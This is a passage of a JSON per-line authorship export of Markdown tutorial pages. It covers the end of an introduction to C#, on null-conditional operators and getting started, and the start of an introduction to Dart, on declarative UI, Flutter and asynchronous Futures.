        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "public void AddFuelTank() {"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "    fuelTank \u003d  (hasError) ? null : new FuelTank(param3);"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "Car car \u003d Car.ManufactureCar();"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "Double fuelLeft \u003d 0;"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "if (car !\u003d null)"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "    car.AddFuelTank();"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "\tfuelTank \u003d car.GetFuelTank()"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "\tif (fuelTank !\u003d null) {"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "        fuelLeft \u003d fuelTank.GetFuel();"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "DoSomethingTo(fuelLeft);"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "In C#, `null` handling does not need to be done the conventional way. C# has `Nullable` features, such as collaescing operators `??` and null conditional operators `.?`. Some may find this similar to `optionals` in Swift. Applying these features appropriately not only results in shorter and more concise code in general. It makes it easier to reduce the use of indentation as well. Nullables may appear less intuitive to new users, so its value may differ between communities."
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "```csharp"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "public static Car ManufactureCar() {"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "    return (hasError) ? null : new Car(param1, param2);"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "public void AddFuelTank() {"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "    fuelTank \u003d  (hasError) ? null : new FuelTank(param3);"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "Car car \u003d Car.ManufactureCar();"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "//Call Drive method of car if not null"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "car?.AddFuelTank();"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "//Get amount of fuel left with default value 0"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "Double fuelLeft \u003d car?.GetFuelTank()?.GetFuel() ?? 0;"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "DoSomethingTo(fuelLeft);"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "Some explanation of what `Double fuelLeft \u003d car?.GetFuel() ?? 0` does:"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "* If car is not null, one can expect the statement to evaluate to `car.GetFuel()`."
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "* If car is null, `car?.GetFuel()` evaluates to null."
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "* If GetFuelTank() returns null, or car evaluates to null, car?.GetFuelTank()?.GetFuel() evaluates to null."
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "* `??` operator sees null, so the entire expression defaults to 0. If `??` sees a non-null value, the default value is not used."
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "More can be read about Nullables [here](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/nullable-types/)"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Other Features"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "The list of features in C# can be quite long. This article only shows you selected features for their usefulness and ability to represent code more concisely. Some features that were not listed are [Async/Await](https://docs.microsoft.com/en-us/dotnet/csharp/async) and [Default Interface Implementation](https://www.infoq.com/articles/default-interface-methods-cs8). If you wish to explore other features, you may consult this [article](https://stackify.com/csharp-8-features/) and others online."
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "## Why Learn C#"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "C# is high in demand (as per [source1](https://medium.com/sololearn/why-is-c-among-the-most-popular-programming-languages-in-the-world-ccf26824ffcb), [source 2](https://mashable.com/2018/03/17/coding-course-class-bootcamp/#om2xRzXFHGqJ)). It is especially well-suited for Windows apps. It also thrives in game programming because the popualr game engine Unity has great cross-platform compatibility for desktop, web, mobile and console, and has extensive support for 2D/3D games, VR/AR games and games that require networking. C# can even be used on non-Windows environments as the .NET framework has [cross platform](https://en.wikipedia.org/wiki/Cross-platform_software \"In computing, cross-platform software (also multi-platform software or platform-independent software) is computer software that is implemented on multiple computing platforms.\") support via the [Mono project](https://www.mono-project.com/)."
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "## How to Get Started"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "Getting started with C# is not difficult. You can download Visual Studio and follow the setup instructions for C# programming [here](https://www.guru99.com/download-install-visual-studio.html). If you are new to C# but have some familiarity with Java, you may follow the tutorial at [Sololearn](https://www.sololearn.com/Play/CSharp). It is a rather comprehensive tutorial that teaches fundamental syntax and concepts in C#. If you feel that certain parts of the tutorial are too simple, you can also skip them."
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "If you are entirely new to programming, you may find more hands on practice with simpler steps at [CSharp net](https://csharp.net-tutorials.com/getting-started/introduction/). This tutorial tends to be more rigorous and goes through in great detail the steps, starting from installing a development environment, to writing basic C# programs and finally topics commonly used in real applications, such as file handling and debugging. If you wish to skip certain parts of the tutorial, the structured contents are displayed on the right side of the website."
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "If you want to have a go at maintaining and enhancing a small project, you may find this [fictitious airline reservation system](https://1000projects.org/airline-reservation-system-a-net-project-with-code.html) project"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "to be a good starting point. It covers commonly used components of a software, such as UI (Application User Interface), data storage and handling, and the logic behind the program (such as buying a ticket). More similar projects can be found at [1000projects.org](https://1000projects.org/c-projects.html)."
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "If you feel that you have a grasp of C# fundamentals but find it difficult to write programs of bigger scale, you may consult"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "[CSharp corner](https://www.c-sharpcorner.com/UploadFile/bd5be5/design-patterns-in-net/) for a list of design patterns that you may employ to better organise and plan your program structure. Sometimes, you may find that you have problems collaborating on a C# project. This may be due to some common misconceptions and mistakes you are commiting without realisation. You may reduce these problems by reading about [some common mistakes in C# programming](https://www.upwork.com/hiring/development/common-mistakes-in-c-sharp-programming/)."
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "If you want to develop a desktop application for Windows, you may consult [Microsoft\u0027s documentation](https://docs.microsoft.com/en-us/visualstudio/get-started/csharp/tutorial-wpf?view\u003dvs-2019) on creating an application with the `Windows Presentation Foundation`, a framework that is commonly used for creating UI for Windows Applications that has many useful features for building your UI."
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 2,
      "jamessspanggg": 3,
      "iskandarzulkarnaien": 13,
      "-": 184
    }
  },
  {
    "path": "contents/dart/Dart.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  title: Introduction to Dart"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "le0tan"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "le0tan"
        },
        "content": "# Introduction to Dart"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "le0tan"
        },
        "content": "**Author: [Tan Yuanhong](https://github.com/le0tan)**"
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Reviewers: [Daryl Tan](https://github.com/openorclose), [Ang Ze Yu](https://github.com/ang-zeyu), [Tejas Bhuwania](https://github.com/Tejas2805)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "le0tan"
        },
        "content": "## What is Dart?"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Dart (previously also known as `dartlang`) is an object-oriented, \u003ctooltip content\u003d\"a style of Object-oriented programming (OOP) in which inheritance occurs via defining classes of objects, instead of inheritance occurring via the objects alone (compare prototype-based programming)\"\u003eclass defined\u003c/tooltip\u003e, garbage-collected language using a C-style syntax that \u003ctooltip content\u003d\"also known as source-to-source compilation\"\u003etranscompiles\u003c/tooltip\u003e optionally into JavaScript. It\u0027s rumored that Dart was invented out of Google engineers\u0027 frustration with JavaScript (they even built [a version of Chromium browser](https://dartdoc.takyam.com/tools/dartium/) with Dart VM so that Dart code can be run on the web without transcompiling to JavaScript). However, as most developers still stick to JavaScript and it turned out that TypeScript is a much more widely-accepted solution for statically typed JavaScript transcompilation, Dart is then, with the emergence of \u003ctooltip content\u003d\"a cross-platform mobile UI framework developed by Google\"\u003eFlutter\u003c/tooltip\u003e, re-purposed as a **client-optimized** language that\u0027s optimized for **UI creation** and **cross-platform execution**."
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "le0tan"
        },
        "content": "## Why Learn Dart?"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "le0tan"
        },
        "content": "### Optimized for Declarative UI"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cpanel header\u003d\"If you don\u0027t know what **declarative UI** is...\" minimized\u003e"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "le0tan"
        },
        "content": "To be more specific, why is reactive programming, a declarative programming paradigm, important for UI development?"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "le0tan"
        },
        "content": "**What is reactive programming?** Consider the expression `a \u003d b + c`, in the world of *imperative programming*, it simply means \"calculate the value of `b + c`, assign the result to `a`\" - changing the value of `b` or `c` later would not change `a`. However, with reactive programming, you can consider `a` will always evaluate to the result of `b+c` even without you explicitly calling `a\u003db+c`. Such behavior is especially useful for writing UI - you no longer need to manually update the information displayed with a setter of some kind. Simply *declare* that variable `x` is related to UI element `y`, the runtime will update `y` whenever it detects a change in `x`. In short, reactive programming saves you from the headache of maintaining the consistency between the UI and internal states."
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "le0tan"
        },
        "content": "From above, you can see that *reactive programming* is by nature *declarative* as you don\u0027t write code to tell computers what to do at each step, you describe what\u0027s the expected behavior (e.g. a box should be centered at the screen, a button should turn grey when clicked, etc.). "
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "le0tan"
        },
        "content": "In fact, **declarative (and reactive) UI** is an industry trend on all platforms - Android has [Jetpack Compose](https://developer.android.com/jetpack/compose), iOS has [Swift UI](https://developer.apple.com/xcode/swiftui/), Web has [React](https://reactjs.org/) and [Vue.js](https://vuejs.org/), mobile cross-platform has [React Native](https://reactnative.dev/) and [Flutter](https://flutter.dev/)."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003c/panel\u003e"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "le0tan"
        },
        "content": "**Dart is optimized for declarative UI.** Dart\u0027s syntax allows you to write statically typed code in a JSON-like way, and writing asynchronous code is a breeze in Dart, both of which makes Dart an ideal choice for developing declarative UI."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "le0tan"
        },
        "content": "For the reasons above, Dart is adopted by Flutter, a cross-platform mobile UI framework. \u003ctrigger trigger\u003d\"click\" for\u003d\"modal:flutter_info\"\u003e(Why Flutter?)\u003c/trigger\u003e Not only you shall build Flutter apps using Dart, the Flutter framework itself is written in \u003ctooltip content\u003d\"platform-dependent channel methods excluded, of course...\"\u003epure Dart\u003c/tooltip\u003e. In short, Dart is suitable for writing declarative UI, and Dart is a pre-requisite for Flutter."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cmodal header\u003d\"**What\u0027s nice (or unique) about Flutter?**\" id\u003d\"modal:flutter_info\" center large\u003e"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Flutter is open-source, fast-growing and easy-to-learn."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cul\u003e"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cli\u003eApps written in Flutter runs as a single page application as it renders everything with its own rendering engine - just like most of the mobile games. This approach makes UI consistency a breeze - you can be confident that what you see on Android emulator will be exactly the same when it\u0027s published to iOS.\u003c/li\u003e"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cli\u003eFlutter supports stateful hot reload - your changes to both UI and logic code can be reflected to the running emulator within a second, and the states will be preserved.\u003c/li\u003e"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cli\u003eFlutter (in release mode) compiles everything to native machine code - unlike some other cross-platform frameworks that makes use of some kind of middleware (e.g. JS Bridge in React Native) to communicate with the native APIs.\u003c/li\u003e"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003c/ul\u003e"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003c/modal\u003e"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "le0tan"
        },
        "content": "### Fast Development and Native Performance"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "le0tan"
        },
        "content": "A programming language usually needs to balance between development speed and performance. Dart is ambitious: it wants to **run fast** on all platforms (which requires compilation to native machine code) while allowing the developers to **live reload code changes** without re-compiling the entire file (which requires a VM of some kind). Thus, Dart has three execution modes for the best of all words:"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* for fast development, \u003ctooltip content\u003d\"Just-in-time\"\u003eJIT\u003c/tooltip\u003e + Dart VM; "
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* for native performance: \u003ctooltip content\u003d\"Ahead-of-time\"\u003eAOT\u003c/tooltip\u003e compilation to platform-specific instructions; "
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* for browser support: source-to-source compiler to JavaScript"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "le0tan"
        },
        "content": "The flexibility provided by the three execution modes of Dart makes Dart unique in the world of programming languages - there are few languages that maintains three components (i.e. VM, compiler and transpiler). It\u0027s a lot of work for the Dart maintainers, but saves a lot of work for Dart developers."
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "le0tan"
        },
        "content": "## Notable Characteristics"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "le0tan"
        },
        "content": "### Built-In Asynchrony Support"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Asynchronous programming is important for UI development because you don\u0027t want your UI to freeze when some time-consuming operation (e.g. network request, computationally heavy subroutines) is happening. "
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "le0tan"
        },
        "content": "There are three major ways Dart supports asynchronous programming"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* [`Future`](https://api.dart.dev/stable/2.7.1/dart-async/Future-class.html) object, which is very similar to [JavaScript promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* [`Stream`](https://api.dart.dev/stable/2.7.1/dart-async/Stream-class.html) object, which can be \"subscribed\" to"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* `async` and `await` syntax"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Asynchronous programming is commonly used in UI because certain operations are not instant, most common of which is HTTP requests:"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```dart"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "le0tan"
        },
        "content": "import \u0027dart:html\u0027;"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "le0tan"
        },
        "content": "main(List\u003cString\u003e args) {"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  Future\u003cString\u003e respFuture \u003d HttpRequest.getString(\u0027https://jsonplaceholder.typicode.com/todos/1\u0027);"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  respFuture.then((result) \u003d\u003e print(result));"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  print(\"Hello world\");"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "le0tan"
        },
        "content": "}"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cpanel header\u003d\"DartPad example\" minimized\u003e\u003ciframe style\u003d\"width: 100%; height: 400px;\" src\u003d\"https://dartpad.dev/embed-inline.html?id\u003d9dfa68887ae9b57f87d2eccfd061c675\u0026split\u003d50\"\u003e\u003c/iframe\u003e\u003c/panel\u003e"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "le0tan"
        },
        "content": "You should expect \"Hello world\" to be printed before the HTTP request\u0027s result because `Future` object makes sure that the progress of `main` will not be hindered by the HTTP request. Instead, *callback function* `(result) \u003d\u003e print(result)` is called whenever the result is ready - thus **asynchronous**."
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "le0tan"
        },
        "content": "However it\u0027s possible to enforce the \"line-by-line\" execution order by using `await` in an `async` function:"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```dart"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "le0tan"
        },
        "content": "import \u0027dart:html\u0027;"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "le0tan"
        },
        "content": "main(List\u003cString\u003e args) async {"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  var result \u003d await HttpRequest.getString(\u0027https://jsonplaceholder.typicode.com/todos/1\u0027);"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  print(result);"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  print(\"Hello world\");"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "le0tan"
        },
        "content": "}"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cpanel header\u003d\"DartPad example\" minimized\u003e\u003ciframe style\u003d\"width: 100%; height: 400px;\" src\u003d\"https://dartpad.dev/embed-inline.html?id\u003d1aa4acd76e7a874844564913d26a72b3\u0026split\u003d50\"\u003e\u003c/iframe\u003e\u003c/panel\u003e"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "le0tan"
        },
        "content": "You may understand `await` as \"waiting for the result, do not proceed until it\u0027s ready\". `.then` and `await` are two different ways of consuming the result of a `Future`. To help you better understand the difference between `async-await` and `then`, here is an example:"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cpanel header\u003d\"Example\"\u003e"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "le0tan"
        },
        "content": "If you are to write callback functions for futures `f1` and `f2` separately, they will execute \"in parallel\". You should expect to see \"String from the future\" before \"Must come second\"."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```dart"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "le0tan"
        },
        "content": "main() {"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  var f1 \u003d Future.delayed(Duration(seconds: 1), () \u003d\u003e \u0027String from the future\u0027);"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  var f2 \u003d Future.delayed(Duration(seconds: 2), () \u003d\u003e \u0027Must come second\u0027);"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  f1.then((res1) \u003d\u003e print(res1));"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  f2.then((res2) \u003d\u003e print(res2));"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "le0tan"
        },
        "content": "}"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cpanel header\u003d\"DartPad example\" minimized\u003e\u003ciframe style\u003d\"width: 100%; height: 400px;\" src\u003d\"https://dartpad.dev/embed-inline.html?id\u003debdcc9d8de89c26ceed7b1255bf40395\u0026split\u003d50\"\u003e\u003c/iframe\u003e\u003c/panel\u003e"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "le0tan"
        },
        "content": "However, if you only want to request the content of `f2` after `f1` is ready, you may nest callback functions like below:"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```dart"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "le0tan"
        },
        "content": "main() {"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  var f1 \u003d Future.delayed(Duration(seconds: 1), () \u003d\u003e \u0027String from the future\u0027);"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  var f2 \u003d Future.delayed(Duration(seconds: 2), () \u003d\u003e \u0027Must come second\u0027);"
      },
      {
        "lineNumber": 123,
        "author": {
